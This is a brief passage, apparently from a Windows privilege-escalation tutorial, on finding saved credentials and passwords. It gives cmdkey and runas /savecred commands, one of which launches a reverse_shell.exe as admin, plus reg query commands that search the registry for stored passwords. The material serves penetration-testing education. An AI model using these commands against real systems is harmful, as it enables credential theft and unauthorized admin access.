**Saved credentials:** Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.  
`cmdkey /list`  

If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.  
`runas /savecred /user:admin reverse_shell.exe`  
  
**Registry keys:** Registry keys potentially containing passwords can be queried using the commands below.  
`reg query HKLM /f password /t REG_SZ /s`  
`reg query HKCU /f password /t REG_SZ /s`